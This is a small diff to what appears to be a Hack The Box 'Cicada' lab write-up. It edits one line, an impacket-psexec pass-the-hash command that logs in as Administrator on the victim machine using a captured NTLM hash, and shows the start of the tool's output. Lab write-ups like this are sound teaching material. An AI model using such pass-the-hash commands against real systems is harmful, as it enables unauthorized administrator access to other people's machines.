@@ -115,7 +115,7 @@ Thanks to windows and it's silliness, I can just pass the administrator hash usi
 
 ```
 ┌──(kali㉿kali)-[~/…/htb/writeups/cicada/loot]
-└─$ impacket-psexec cicada.htb/Administrator@$VICTIM_IP -hashes 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
+└─$ impacket-psexec $DOMAIN/Administrator@$VICTIM_IP -hashes 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Requesting shares on $VICTIM_IP.....
